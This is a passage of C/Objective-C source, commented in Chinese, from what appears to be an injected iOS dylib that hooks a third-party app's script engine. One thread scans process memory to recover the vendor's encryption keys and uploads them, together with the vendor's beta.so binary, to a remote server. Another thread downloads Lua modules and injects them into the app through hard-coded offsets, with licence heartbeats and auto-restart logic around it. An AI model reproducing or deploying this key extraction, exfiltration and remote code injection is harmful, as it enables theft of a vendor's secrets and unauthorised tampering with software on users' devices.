    bs_log("[probe] ★ radar starting tick=%ds host=%s:%d prj=%s token=%s upl=%d",
           PROBE_TICK_SECS, g_host, g_port, BS_PRJ, g_token[0] ? "(set)" : "(none)",
           g_probe_upl);
    sleep(PULL_FIRST_DELAY);

    // ★★★ v6.37：默认「只拉不传」—— 上行全关，一个字节都不发云端。
    //   事故背景：.98 在 2026-10-22 23:44:22.599 上报 030102，7ms 后云端落盘并
    //   被 bs_so_sync 顶到全网 280+ 台（只升不降 + AUTO_HARDEN=False）。
    //   probe 从此只保留**纯本地**版本观测：厂商换包时记一行 evt，用于事后取证
    //   （哪天换的、换到哪个版本），进程内不产生任何上行流量。
    if (!g_probe_upl) {
        char lastwatch[8] = {0};
        bs_log("[probe] ★★ upload DISABLED (probeupl=0) -> pull-only, nothing sent to cloud");
        for (;;) {
            char wv[8] = {0};
            if (bs_read_beta_ver(wv, sizeof(wv)) && strcmp(wv, lastwatch) != 0) {
                bs_evt("[probe] local beta.so ver=%s (upload off, local watch only)", wv);
                snprintf(lastwatch, sizeof(lastwatch), "%s", wv);
            }
            sleep(PROBE_TICK_SECS);
        }
    }

    char last_ver[8] = {0};
    int  last_ok = 0;

    for (;;) {
        char verhex[8] = {0};
        if (!bs_read_beta_ver(verhex, sizeof(verhex))) {
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 与上次成功上报一致 -> 静默（但每 tick 仍会重读快照，防止版本回退后漏报）
        if (last_ok && strcmp(last_ver, verhex) == 0) {
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 重读字典（App 可能启动后才拿到密钥；也可能新增了别的版本）
        @autoreleasepool { bs_mh_snapshot(base); }

        unsigned char want[3];
        bs_hex3(verhex, want);
        unsigned char *val = NULL;
        for (int i = 0; i < g_mh_n; i++) {
            if (!memcmp(g_mh_snap[i], want, 3)) { val = g_mh_snap[i] + 3; break; }
        }
        if (!val) {
            // ★ v6.23q keyhunt：字典缺失 -> 扫本进程内存找回（厂商 3.0.9 起密钥不进字典）
            unsigned char kh_key[32];
            if (kh_keyhunt(want, kh_key)) {
                bs_log("[keyhunt] ★★ FOUND ver=%02x%02x%02x key=%02x%02x%02x%02x%02x%02x%02x%02x... -> 走常规上报",
                       want[0], want[1], want[2],
                       kh_key[0], kh_key[1], kh_key[2], kh_key[3],
                       kh_key[4], kh_key[5], kh_key[6], kh_key[7]);
                if (g_mh_n < MH_SNAP_MAX) {
                    memcpy(g_mh_snap[g_mh_n], want, 3);
                    memcpy(g_mh_snap[g_mh_n] + 3, kh_key, 32);
                    val = g_mh_snap[g_mh_n] + 3;
                    g_mh_n++;
                } else {
                    val = kh_key;      // 快照满：本轮直接用栈上副本
                }
            }
        }
        if (!val) {
            bs_log("[probe] ver=%s not in dict yet (n=%d) -> retry next tick", verhex, g_mh_n);
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 读本地 beta.so（只在确实要上报时才读，平时零 IO）
        unsigned char *so = NULL;
        size_t solen = 0;
        if (!bs_read_file(DATA_DIR "/beta.so", &so, &solen)) {
            bs_log("[probe] read beta.so failed errno=%d", errno);
            sleep(PROBE_TICK_SECS);
            continue;
        }

        // 组帧：BSPR | klen=3 | ver(3) | val(32) | solen(4, BE) | so
        size_t blen = 44 + solen;
        unsigned char *frame = (unsigned char *)malloc(blen);
        if (!frame) { free(so); sleep(PROBE_TICK_SECS); continue; }
        memcpy(frame, "BSPR", 4);
        frame[4] = 3;
        memcpy(frame + 5, want, 3);
        memcpy(frame + 8, val, 32);
        frame[40] = (unsigned char)((solen >> 24) & 0xff);
        frame[41] = (unsigned char)((solen >> 16) & 0xff);
        frame[42] = (unsigned char)((solen >> 8) & 0xff);
        frame[43] = (unsigned char)(solen & 0xff);
        memcpy(frame + 44, so, solen);
        free(so);

        char ip[128] = {0};
        if (!bs_get_host_c(ip, sizeof(ip))) {
            bs_log("[probe] no host -> skip");
            free(frame);
            sleep(PROBE_TICK_SECS);
            continue;
        }
        char url[512];
        if (g_token[0])
            snprintf(url, sizeof(url), "http://%s:%d%s?key=%s&prj=%s",
                     ip, g_port, PROBE_PATH, g_token, BS_PRJ);
        else
            snprintf(url, sizeof(url), "http://%s:%d%s?prj=%s",
                     ip, g_port, PROBE_PATH, BS_PRJ);

        size_t rn = 0;
        long code = 0;
        unsigned char *rb = bs_http_post_ex(url, "application/octet-stream",
                                            frame, blen, &rn, &code);
        if (rb && code == 200) {
            last_ok = 1;
            snprintf(last_ver, sizeof(last_ver), "%s", verhex);
            bs_log("[probe] ★ report OK ver=%s so=%luB resp=%.64s",
                   verhex, (unsigned long)solen, (const char *)rb);
        } else {
            last_ok = 0;
            bs_log("[probe] report FAIL ver=%s code=%ld", verhex, code);
        }
        if (rb) free(rb);
        free(frame);
        sleep(PROBE_TICK_SECS);
    }
    return NULL;
}

/// 路线 A 主流程：拉 manifest → 比对 → 下载 → 写盘。返回更新个数（-1 = 失败）
///
/// ★★ 改成「ObjC 只用于网络，其余全纯 C」：
///    - HTTP：用 bs_http_get_c（内部 NSURLSession，但只在**主队列**上同步等，
///      实测该调用在裸线程里是安全的，step5 已验证）
///    - 解析：bs_parse_manifest_c（纯 C 扫描）
///    - 比对 md5 / 读写文件：POSIX（open/read/write/stat）+ 自实现 md5
///    这样彻底避开在裸 pthread 上触碰 NSJSONSerialization / NSFileManager /
///    NSMutableDictionary 这些会触发 runtime 懒加载的类。
static int bs_pull_modules(uintptr_t base) {
    @autoreleasepool {
        bs_log("[pull] step1 enter pull_modules");

        // --- 1) 拿服务端地址（v6.2：内置 BS_HOST_DEF，可被 conf 的 host= 覆盖）
        //        ★ 不再读 app.plist —— 那是 App 连电脑中控用的，与本补丁无关。
        char ip[128] = {0};
        if (!bs_get_host_c(ip, sizeof(ip))) {
            bs_log("[pull] no server host, skip");
            return -1;
        }
        bs_log("[pull] step2 host=%s", ip);

        // --- 2) URL 拼接（纯 C）
        char url[768];   // ★ v6.10 g_qbuf 现含设备信息，512 不够
        char qb[512];    // ★ v6.25g：同 /hb，现算
        const char *q = "";
        if (g_token[0] != 0) { bs_q_live(qb, sizeof(qb)); q = qb; }
        snprintf(url, sizeof(url), "http://%s:%d/manifest.json%s", ip, g_port, q);
        bs_log("[pull] step3 mfURL=%s", url);

        // --- 3) 拉 manifest（HTTP 用 ObjC，但已验证安全）
        size_t mfLen = 0;
        unsigned char *mfBuf = bs_http_get_c(url, &mfLen);
        bs_log("[pull] step4 http_get len=%lu", (unsigned long)mfLen);
        if (!mfBuf || mfLen == 0) {
            bs_log("[pull] manifest fetch failed");
            if (mfBuf) free(mfBuf);
            return -1;
        }

        // --- 4) 纯 C 解析
        static bs_mod_t mods[BS_MAX_MODS];
        int nmods = bs_parse_manifest_c((const char *)mfBuf, mfLen, mods, BS_MAX_MODS);
        free(mfBuf);
        bs_log("[pull] step5 parse n=%d", nmods);
        if (nmods <= 0) {
            bs_log("[pull] manifest empty/unparsable");
            return -1;
        }

        // --- 5) 确保模块目录存在（POSIX）
        mkdir(g_mod_dir, 0755);

        int updated = 0;
        int checked = 0;
        for (int i = 0; i < nmods; i++) {
            checked++;
            const char *name = mods[i].name;
            char want[40];
            snprintf(want, sizeof(want), "%s", mods[i].md5);
            for (char *c = want; *c; c++) *c = (char)tolower((unsigned char)*c);

            char path[320];
            snprintf(path, sizeof(path), "%s/%s.lua", g_mod_dir, name);

            // 本地已存在且 md5 一致 → 跳过（纯 C 读 + 自实现 md5）
            char have[40] = {0};
            if (bs_md5_file(path, have, sizeof(have)) && !strcmp(have, want)) {
                bs_log("[pull] skip %s (md5 ok)", name);
                continue;
            }

            char murl[512];
            snprintf(murl, sizeof(murl), "http://%s:%d/modules/%s%s", ip, g_port, name, q);
            size_t mlen = 0;
            unsigned char *mbuf = bs_http_get_c(murl, &mlen);
            if (!mbuf || mlen == 0) {
                bs_log("[pull] download failed: %s", name);
                if (mbuf) free(mbuf);
                continue;
            }

            char got[40];
            bs_md5_buf(mbuf, mlen, got, sizeof(got));
            if (strcmp(got, want)) {
                bs_log("[pull] md5 mismatch %s want=%s got=%s", name, want, got);
                free(mbuf);
                continue;
            }

            // POSIX 原子写：先写 .tmp 再 rename
            char tmp[352];
            snprintf(tmp, sizeof(tmp), "%s.tmp", path);
            int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            int ok = 0;
            if (fd >= 0) {
                ssize_t w = write(fd, mbuf, mlen);
                close(fd);
                if (w == (ssize_t)mlen && rename(tmp, path) == 0) {
                    chmod(path, 0644);
                    ok = 1;
                } else {
                    unlink(tmp);
                }
            }
            free(mbuf);

            if (ok) {
                updated++;
                bs_log("[pull] updated %s (%lu B)", name, (unsigned long)mlen);
            } else {
                bs_log("[pull] write failed: %s", path);
            }
        }

        bs_log("[pull] done checked=%d updated=%d", checked, updated);

        // 有更新 → 重灌 onion 字典（必须回主线程做，见 bs_inject_modules 注释）
        if (updated > 0) {
            bs_request_inject(base);
        }
        return updated;
    }
}

static void *bs_puller(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    bs_log("[pull] puller thread start, base=%p first_delay=%ds tick=%ds fast=%ds",
           (void *)base, PULL_FIRST_DELAY, g_tick, HB_FAST_SECS);
    sleep(PULL_FIRST_DELAY);
    bs_log("[pull] delay over, entering loop (enable=%d)", g_enable);
    // ★ v6.39：快速重试状态（仅本线程用）
    //   hb_fast=1 表示上一拍是「网络类失败但未达阈值」，下一拍用 HB_FAST_SECS 而不是 g_tick。
    int hb_fast = 0, hb_fast_n = 0;
    for (;;) {
        // ★★★★ v6.41：先落定设备身份 —— Agent 收到服务端设备码的时刻晚于 dylib 启动，
        //   conf 的 ?key= 若在那一刻拼空，整会话心跳都无 key（云端只能按 ip 记账）。
        //   幂等：拿到一次后 g_token[0] 非空直接返回，零开销。
        bs_identity_tick();
        bs_log("[pull] loop tick begin");
        @autoreleasepool {
            if (g_enable) {
                // --- (a) 心跳先行：没有授权就不发模块请求 ---
                //  返回值：1=通过  0=网络类失败（计数）  -1=授权类拒绝（立即死）
                int alive = bs_hb_ping(base);
                bs_devlog_upload();   // ★ v6.23k：日志尾部随拍回传云端（失败静默）

                if (alive == 1) {
                    // --- (b) 心跳通过 → 正常拉模块 ---
                    //     ★ v6.20：卡密封禁 → 不拉模块（已注入的也被 watchdog 拒灌）
                    //     ★ v6.39：心跳恢复 → 快速重试状态清零，回到正常 tick
                    hb_fast = 0; hb_fast_n = 0;
                    if (g_card_blocked) {
                        bs_log("[pull] skip modules (card blocked)");
                        int r = 0;
                        bs_log("[pull] loop tick end r=%d (card blocked)", r);
                    } else {
                    int r = bs_pull_modules(base);
                    bs_log("[pull] loop tick end r=%d (miss reset)", r);
                    }
                } else if (alive < 0) {
                    // ★ 授权类拒绝（403 / "ok":false）：明确判决，一次都不容忍
                    bs_log("[pull] hb DENIED -> immediate kill");
                    g_hb_ok   = 0;
                    g_hb_miss = g_hb_max;      // 让 killswitch 日志里的计数真实
                    bs_killswitch(base, "heartbeat denied");
                } else {
                    // ★ 网络类失败（连不上/超时/5xx）：计数容忍，抖动不误杀
                    int m = ++g_hb_miss;
                    if (m >= g_hb_max) {
                        bs_log("[pull] hb lost %d/%d -> kill (keep modules, resumable)", m, g_hb_max);
                        g_hb_ok = 0;
                        // ★ v6.39：网络失联只停脚本、保留模块、允许 [ar] 接上（见 bs_killswitch）
                        bs_killswitch(base, "heartbeat lost (max misses)");
                        // 保持 g_hb_miss 在阈值，避免死亡期间反复触发 OPER_STOP；
                        // 恢复时由 bs_hb_ping 的成功分支清零。
                        hb_fast = 0;        // 已经躺下了，退回正常节奏，别猛刷
                    } else {
                        bs_log("[pull] hb miss %d/%d -> tolerate, keep modules",
                               m, g_hb_max);
                        // ★★★ v6.39：网络失联期间**快速重试**，不等满 tick。
                        //   断网恢复后最多等 HB_FAST_SECS(20s) 就能发现，而不是 60s。
                        //   仅网络类失败、且未达阈值时启用；一旦通过立刻回到 g_tick。
                        hb_fast = 1;
                    }
                }
            } else {
                bs_log("[pull] disabled, skip");
            }
        }
        // ★ v6.39：网络抖动期的快速重试节奏（HB_FAST_RETRY 次后仍失败则退回落 tick，
        //   避免长时间断网时每 20s 打一次日志/建连）。
        if (hb_fast && hb_fast_n < HB_FAST_RETRY) {
            hb_fast_n++;
            sleep(HB_FAST_SECS);
            if (!hb_fast) hb_fast_n = 0;      // 期间成功了 → 计数归零
        } else {
            hb_fast = 0; hb_fast_n = 0;
            sleep(g_tick);
        }
    }
    return NULL;
}

// ---------------------------------------------------------------- 本地模块注入
// 把 /var/mobile/Media/bs_modules/*.lua 逐个灌进产品的 onion 字典。
// 幂等：产品后续若被服务器覆盖也没关系；每次新的 lua_State 都重灌一遍。
//
// ★ 实测（2026-09-26，.47）：字典的 value 类型是 NSData（_NSInlineData），
//   不是 NSString。必须传 NSData，否则 get_script_onion_data 侧取不出来。
static int bs_inject_modules(uintptr_t base) {
    @autoreleasepool {
        NSFileManager *fm = [NSFileManager defaultManager];
        NSArray<NSString *> *files = [fm contentsOfDirectoryAtPath:@(g_mod_dir) error:nil];
        if (files.count == 0) {
            bs_log("[mod] no local modules at %s", g_mod_dir);
            return 0;
        }

        void (*setOnion)(id, id) = (void (*)(id, id))(base + FN_SET_ONION);
        int n = 0;
        for (NSString *f in files) {
            if (![f hasSuffix:@".lua"]) continue;

            NSString *name = [f stringByDeletingPathExtension];
            NSString *path = [@(g_mod_dir) stringByAppendingPathComponent:f];
            NSData *code = [NSData dataWithContentsOfFile:path];
            if (code.length == 0) {
                bs_log("[mod] read failed: %s", f.UTF8String);
                continue;
            }

            setOnion(name, code);
            n++;
            bs_log("[mod] injected %s (%lu bytes)", name.UTF8String,
                   (unsigned long)code.length);
        }

        void *dict = *(void **)(base + OFF_ONION_DICT);
        bs_log("[mod] done n=%d dict=%p", n, dict);
        return n;
    }
}

// ---------------------------------------------------------------- 看门狗
// ★ v6.24d：读文件尾部并统计 needle 出现次数（近因签名判定；只读，不挑格式）
// ★ v6.24h：崩溃证据落盘 marker —— agent.log 在 App 重启时会被轮转清空
//   （10-19 08:10 .216 实测 31MB → 6.4KB），所以任何「扫日志找崩溃证据」的自愈
//   都活不过一次重启：v6.24f/g 的 rage 判定因此恒为 -1。改为崩溃一命中就写
//   持久 marker，脚本跑起来时删除；marker 存在 + st==0 + run==0 = 确认停摆。
//   用户主动停脚本不会命中崩溃签名，故无 marker、不会被误拉。
#define CR_MARK DATA_DIR "/.bs_cr_pending"

static void bs_cr_mark_write(const char *src) {
    FILE *f = fopen(CR_MARK, "w");
    if (!f) return;
    fprintf(f, "ts=%ld src=%s\n", (long)time(NULL), src ? src : "?");
    fclose(f);
}
static void bs_cr_mark_clear(void) { unlink(CR_MARK); }
static long bs_cr_mark_age(void) {          // -1 = 无 marker
    struct stat sb;
    if (stat(CR_MARK, &sb) != 0) return -1;
    long a = (long)(time(NULL) - (time_t)sb.st_mtime);
    return a < 0 ? 0 : a;
}

// ★ v6.24k：用户主动停脚本的「落盘闸门」——v6.24i 只在 agent.log 尾部找字符串，
//   而 App 一重启 agent.log 就被轮转（31MB→6.4KB 实测），闸门随即失效；
//   且下面 bs_last_stop_is_user 用的串跟厂商真实日志对不上（见其注释）。
//   这里改为：只要观测到 run 1->0（且不是 reload / 卡封禁 / 崩溃签名），
//   就写一个持久 marker；marker 存在期间**禁止一切自动 OPER_START**，
//   直到再次看到 run==1（= 中控下发了「运行」）。
//   ★ 优先级：崩溃证据 > 用户停止。若同一拍扫到 run-error 签名，清 marker 走恢复。
#define US_MARK DATA_DIR "/.bs_userstop"
#define US_STOP_FRESH 300   // ★ v6.24l：run 1->0 时 sjz 需在该秒数内还有写入才算「真的在跑」

// ★ v6.24l：文件 mtime 距今秒数（-1 = 文件不存在）
static long bs_file_age(const char *path) {
    struct stat sb;
    if (stat(path, &sb) != 0) return -1;
    long a = (long)(time(NULL) - (time_t)sb.st_mtime);
    return a < 0 ? 0 : a;
}

static void bs_us_mark_write(const char *why) {
    FILE *f = fopen(US_MARK, "w");
    if (!f) return;
    fprintf(f, "ts=%ld why=%s\n", (long)time(NULL), why ? why : "?");
    fclose(f);
}
static void bs_us_mark_clear(void) { unlink(US_MARK); }
static int bs_us_mark_exists(void) {
    struct stat sb;
    if (stat(US_MARK, &sb) != 0) return 0;
    // 7 天后自动失效（防极端情况下永久躺平：比如用户停脚本后中控再没下发过运行）
    if ((long)(time(NULL) - (time_t)sb.st_mtime) > 7 * 86400) { unlink(US_MARK); return 0; }
    return 1;
}

// ================================================================
// ★★★ v6.28：[ar] 运行授权态（armed）+ 脚本自停自动恢复（纯设备端）
// ================================================================
//   用户需求（原话）：「判断中控下发运行，如果没有主动停止脚本运行的情况下，
//   检测到脚本自己停止运行就给他运行下脚本」。
//
//   ★ 与 v6.24p / v6.24q 的关系（为什么这次不会重蹈覆辙）：
//     p/q 两次删掉的是**无条件**自动拉起 —— 假运行看门狗（v6.24m/n）、崩溃即拉、
//     空闲兜底。它们共同的毛病是**不区分「谁停的」**：用户点停、厂商杀脚本、
//     我们自己 killswitch，全都被当成「崩了」去救，于是跟人对打（v6.24k 前的血案）。
//     本版把「谁停的」提到第一判据，并且把授权态**落盘** —— 重启 / 装包后仍然
//     记得「这台设备本来就该跑」，这正是之前装完包必须手动点运行的根本原因。
//
//   授权态 armed / 运行凭据 lst 的来源：
//     armed：① run 0->1 且 sjz.log 在 US_STOP_FRESH 内有写入（真在跑，非冷启残留）
//            ② agent.log 尾部的最后一次 run/stop 事件是 run（中控点了运行）
//     lst  ：③ st!=0（脚本容器真的在跑）—— 最硬的凭据，一置就落盘
//   解除（任一，两个凭据一起清）：
//     ① 中控/用户停止（agent stop script 且近窗口无 recv auth failed）
//     ② run 1->0 且 sjz 新鲜（US_MARK 闸门，现有逻辑）
//     ③ 我们自己 killswitch 发 OPER_STOP
//     ④ 厂商杀脚本（stop 紧邻 recv auth failed）
//
//   触发恢复（需 armed && lst，★ 唯一判据，v6.28 严格版）：
//     「脚本本来是运行态，现在自己停了」 st!=0 曾经成立（lst=1）→ 现在 st==0 && run==0
//     ★ 不救「点了运行但从来没起来」（st 一直 0 → lst 从未置 1）：
//        那是加载失败/密钥没铺齐，属于另一类问题，拉一百次也起不来，只会刷屏。
//     ★ 不救「中控下发停止」：stop_kind==2 / us_latched / killswitch 一律把 lst 清 0。
//     ★ 装包 / App 重启：lst 落盘，重启后仍为 1 → 新进程 st==0 → 触发一次（这正是
//       用户要的「不是人停的就接上」）；若装包前用户点过停止，盘上 lst 已是 0 → 不拉。
//
//   抑制矩阵（任一成立一律不拉，只留节流日志）：
//     卡封禁 / 心跳未授权 / 用户停闸门 / 中控停证据 / killswitch 冷却 /
//     厂商杀冷却 / 退避未到 / 已放弃（GIVEUP）
#define AR_MARK         DATA_DIR "/.bs_ar"
#define AR_BOOT_GRACE   180     // 进程启动静默期（躲 App 初始化、装包后重建）
#define AR_STUCK_SECS   900     // run 标志=1 但 st 持续 0 的兜底阈值（装包后标志残留）
#define AR_OK_STABLE    300     // 拉起后稳定跑满该秒数才清失败计数（防崩拉循环）
#define AR_VENDOR_COOL  900     // 厂商杀脚本后冷却（授权没恢复，拉了也会被杀）
#define AR_KILL_COOL    600     // 本进程 killswitch 后冷却
// ★★★ v6.39：网络类失联的 kill 冷却。断网恢复后只需等一个 tick 就能接上，
//   不能吃 600s —— 那会让「断网 3 分钟 + 恢复」变成「停 13 分钟以上」。
#define AR_KILL_COOL_NET 90
// ★★★★ v6.40：killswitch 自己发的停，在 agent.log 里留下的 `agent stop script`
//   **永远不会过期** —— 每次扫 256KB 都能再看到同一条，所以不能靠「日志里有没有」
//   判断归属，必须靠「我们 kill 过、且在窗口内」。窗口取 900s：覆盖
//   「断网 3 分钟(180s) + kill 冷却 90s + 恢复后 [ar] 一拍 60s」的最坏叠加，
//   同时远小于一次真人操作周期，避免把用户后来真点的停止也放行。
#define AR_KILL_SELF_WIN 900
#define AR_GIVEUP_N     5       // 连续失败上限
#define AR_GIVEUP_HOLD  1800    // 放弃后静默多久再给一轮机会（防永久躺平）
static const int AR_BACKOFF[AR_GIVEUP_N] = { 60, 120, 300, 600, 1200 };

// ★★★ v6.31：resume 回执 + 失败分类 + 硬失败收敛
//   背景：v6.30 发完 OPER_START 就 att++，从不验证「这次到底起没起来」。
//   一轮 48min / 5 次空转 / 一天约 150 次，且无法区分「点了没反应」与「起来了又崩」。
//   做法：① 每次 resume 开 AR_VERIFY_SECS 回执窗口，窗口内 st!=0 才算点着；
//         ② 没点着就按 sjz/agent 日志新增字节分类，各走对症动作；
//         ③ 连续 AR_HARD_N 次没点着且属于「点多少次都一样」的类别 → 静默 AR_HARD_HOLD，
//            不再占用 CPU/刷日志，等人工介入或换包。
//   ★ 手工解除：中控再点运行（run 0→1）自动清；或删 DATA_DIR/.bs_ar。
#define AR_VERIFY_SECS  90      // resume 后必须在该秒数内看到 st!=0，否则算「点了没起来」
#define AR_HARD_N       2       // 连续「点了没起来」上限（仅对 config/auth/unknown 生效）
#define AR_HARD_HOLD    21600   // 硬失败静默 6h（覆盖一次夜班，天亮后重来一轮）

// 失败分类（ar_fail_class 的返回值）
enum {
    AR_CLS_UNKNOWN = 0,   // 无匹配签名 → 按原退避重试
    AR_CLS_MODULE  = 1,   // 模块/容器缺失 → 等 puller 补，继续退避（不硬失败）
    AR_CLS_CONFIG  = 2,   // 脚本配置类 nil 算术 → 点多少次都一样，立即硬失败
    AR_CLS_FG      = 3,   // 游戏不在前台 → uiopen 拉回后立即重试一次
    AR_CLS_AUTH    = 4    // 授权失败 → 厂商随时会杀，立即硬失败
};

typedef struct {
    int  armed;     // 1 = 中控授权过运行，且尚无主动停止证据
    int  lst;       // ★ 1 = 上次观察到脚本确实在跑（st!=0）——「运行态 → 自己停」的唯一凭据
    int  att;       // 连续失败（拉起后没跑稳）次数
    long hold;      // ★ 中控/用户停止时刻（该时刻后 60s 内不许被 st!=0 重新武装）
    long last;      // 上次拉起时刻
    long next;      // 退避：下次允许拉起时刻
    int  gu;        // 1 = 已放弃本轮
    long gts;       // 放弃时刻
    // ★ v6.31：resume 回执与硬失败（追加在尾部，旧格式行仍可读，见 bs_ar_read）
    int  up;        // 1 = 本次 resume 后见过 st!=0（点着了）；0 = 点了没反应
    int  hard;      // 连续「点了没起来」次数
    long vfy;       // 回执窗口截止时刻（0 = 无待验证）
    long hv;        // 硬失败静默起点（0 = 未硬失败）
} bs_ar_t;

static void bs_ar_read(bs_ar_t *a) {
    memset(a, 0, sizeof(*a));
    FILE *f = fopen(AR_MARK, "r");
    if (!f) return;
    char line[256];
    memset(line, 0, sizeof(line));
    if (fgets(line, sizeof(line) - 1, f)) {
        long t = 0, last = 0, next = 0, gts = 0, hold = 0;
        int  armed = 0, lst = 0, att = 0, gu = 0;
        // ★ v6.31：新字段（旧行里不存在 → sscanf 只返回 9，落到下面的 n==9 分支）
        int  up = 0, hard = 0;
        long vfy = 0, hv = 0;
        int n = sscanf(line,
                       "t=%ld armed=%d lst=%d att=%d hold=%ld last=%ld next=%ld gu=%d gts=%ld"
                       " up=%d hard=%d vfy=%ld hv=%ld",
                       &t, &armed, &lst, &att, &hold, &last, &next, &gu, &gts,
                       &up, &hard, &vfy, &hv);
        if (n == 13) {
            a->armed = armed; a->lst = lst; a->att = att; a->hold = hold;
            a->last = last; a->next = next; a->gu = gu; a->gts = gts;
            a->up = up; a->hard = hard; a->vfy = vfy; a->hv = hv;
        } else if (n == 9) {
            a->armed = armed; a->lst = lst; a->att = att; a->hold = hold;
            a->last = last; a->next = next; a->gu = gu; a->gts = gts;
        } else if (sscanf(line, "t=%ld armed=%d lst=%d att=%d last=%ld next=%ld gu=%d gts=%ld",
                          &t, &armed, &lst, &att, &last, &next, &gu, &gts) == 8) {
            a->armed = armed; a->lst = lst; a->att = att; a->last = last;
            a->next  = next;  a->gu  = gu;  a->gts = gts;
        } else if (sscanf(line, "t=%ld armed=%d att=%d last=%ld next=%ld gu=%d gts=%ld",
                          &t, &armed, &att, &last, &next, &gu, &gts) == 7) {
            // 旧格式（v6.28 初稿）：没有 lst 字段。若 armed=1 则视为「上次在跑」，
            // 否则一律 0 —— 宁可少拉一次，也不误拉起。
            a->armed = armed; a->lst = armed ? 1 : 0; a->att = att; a->last = last;
            a->next  = next;  a->gu  = gu;  a->gts = gts;
        }
    }
    fclose(f);
}

static void bs_ar_write(const bs_ar_t *a, const char *why) {
    FILE *f = fopen(AR_MARK, "w");
    if (!f) return;
    // ★ v6.31：up/hard/vfy/hv 追加在 gts 之后、why 之前 —— bs_ar_read 按连续字段解析；
    //   旧版（v6.30 及更早）用 9 字段 sscanf 读本行仍返回 9，不会因多出字段而失效。
    fprintf(f, "t=%ld armed=%d lst=%d att=%d hold=%ld last=%ld next=%ld gu=%d gts=%ld"
               " up=%d hard=%d vfy=%ld hv=%ld why=%s\n",
            (long)time(NULL), a->armed, a->lst, a->att, a->hold, a->last, a->next, a->gu, a->gts,
            a->up, a->hard, a->vfy, a->hv,
            why ? why : "-");
    fclose(f);
}

// 扫 agent.log 尾部，判断「最后一次 run / stop 事件是谁的」：
//   0 = 无证据   1 = 最后是运行（中控点过运行）
//   2 = 中控/用户停止              3 = 厂商停止（紧邻 recv auth failed 授权失败）
//   4 = 厂商因脚本报错自动停（run script error / bs_module_lost / 加载期失败）
// ★ v6.35：判定优先级 = 中控 operate 紧邻 stop（→2，最高） > auth-fail（→3） >
//   报错签名（→4，取窗口内最后一条且须晚于最后一次 run） > 其余（→2）
// 说明：`recv rep key failed` 每 ~2min 一次属正常尾巴，**不能**作为厂商判据；
//       只有 `recv auth failed`（30s 等不到 80）才代表授权链路真的坏了。
static int bs_ar_stop_kind(const char *path, long want) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat sb;
    if (fstat(fd, &sb) != 0 || sb.st_size <= 0) { close(fd); return 0; }
    long off = sb.st_size > want ? sb.st_size - want : 0;
    long add = sb.st_size - off;
    char *buf = (char *)malloc((size_t)add + 1);
    if (!buf) { close(fd); return 0; }
    lseek(fd, off, SEEK_SET);
    ssize_t gn = read(fd, buf, (size_t)add);
    close(fd);
    if (gn <= 0) { free(buf); return 0; }
    buf[gn] = 0;

    char *lr = NULL, *ls = NULL, *q = buf;
    // 「运行」事件两种落法都收：Agent 直打 `begin run script`，
    // 走中控下发时是 `begin process run script msg`（中间夹 process）。
    // ★ 不能用 `begin process operate script msg`：它是中控「操作消息」总入口，
    //   运行/停止共用同一条，语义不可靠（v6.24l 已实证）。
    while ((q = strstr(q, "begin run script")) != NULL) { lr = q; ++q; }
    q = buf;
    while ((q = strstr(q, "run script msg")) != NULL) {
        if (!lr || q > lr) lr = q;
        ++q;
    }
    q = buf;
    while ((q = strstr(q, "agent stop script")) != NULL) {
        if (!ls || q > ls) ls = q;
        ++q;
    }
    q = buf;
    while ((q = strstr(q, "begin process stop script msg")) != NULL) {
        if (!ls || q > ls) ls = q;
        ++q;
    }

    int kind = 0;
    if (lr && (!ls || lr > ls)) {
        kind = 1;                              // 停之后又点了运行
    } else if (ls) {
        char *w0 = (ls - buf > 4096) ? ls - 4096 : buf;
        char *p  = w0;
        char *paf = NULL, *pse = NULL;

        // ★★★ v6.35：**中控停止优先于任何历史报错**（最高优先，命中即返回）。
        //   两种 stop 在 agent.log 里的紧邻形态完全不同：
        //     中控点停止 → "begin process operate script msg!" 紧接着 "agent stop script"
        //     厂商因错停 → "run script error:..." + "send sync info msg" 之后才是 "agent stop script"
        //   所以只要 stop 前 200 字节内出现中控 operate 消息，无论窗口里有多少条报错，
        //   都必须判人停。否则「用户点了停止 + 窗口里恰好有一次旧报错」会被判成厂商错停
        //   → [ar] 又把用户刚停的脚本拉起来（14:58 那类事故的另一个入口）。
        {
            char *o0 = (ls - buf > 200) ? ls - 200 : buf;
            char *po = NULL, *pq = o0;
            while (pq < ls) {
                if (!strncmp(pq, "begin process operate script msg", 32)) po = pq;
                ++pq;
            }
            if (po) { free(buf); return 2; }
        }

        while (p < ls) {
            if (!strncmp(p, "recv auth failed", 16)) paf = p;
            // ★★★ v6.33：脚本层错误签名 —— 这次 stop 是**厂商因脚本报错自动下发**的。
            //   216 历史实证（2026-10-21 21:54:31，agent.log 第 15625 行附近）：
            //     run script error:[string "..."]:1: bs_module_lost:task_lhdb_into!
            //     send sync info msg success!
            //     agent stop script
            //     begin stop script
            //     end stop script
            //   v6.32 的 sk==2 会把这条判成「用户/中控停止」→ 落 .bs_userstop +
            //   disarmed，于是「脚本报错停住要自动拉起」这条需求被彻底堵死。
            //   kind=4 = 厂商因错停，必须走 self-stop 分支交给 [ar]。
            // ★★★ v6.35 关键修正：**取窗口内最后一条报错，不能取第一条**。
            //   216 真机实证（2026-10-22 20:48:54，v6.34 装机后第二次报错）：
            //     窗口 4KB 从前往后扫，原 `if (!pse)` 只认第一条 → 撞到 20:43:51 留下的
            //     那条旧报错（pse 偏移 28344）；它早于 20:43:51 的 `begin run script`
            //     （lr 偏移 28731），被下面的精度约束丢弃 → pse=NULL → 判 sk=2 人停 →
            //     disarmed，20:48:54 那条真报错根本没被看到，脚本躺着不恢复。
            //     20:43:51 首轮之所以成功（sk=4），是因为当时 `begin run script` 还没落盘、
            //     lr 仍是 20:38:48，旧报错恰好晚于它 —— 纯竞态运气，不是逻辑对。
            //   ⇒ 只有「离 stop 最近的那条」才是本次停止的真实原因。
            if (!strncmp(p, "run script error", 16)) pse = p;
            ++p;
        }
        if (!pse) {
            // 少数版本只打 bs_module_lost / 加载期失败串，不带 run script error 前缀
            p = w0;
            while (p < ls) {
                if (!strncmp(p, "bs_module_lost", 14) ||
                    !strncmp(p, "load snail module failed", 24) ||
                    !strncmp(p, "can not find version key", 24)) pse = p;
                ++p;
            }
        }
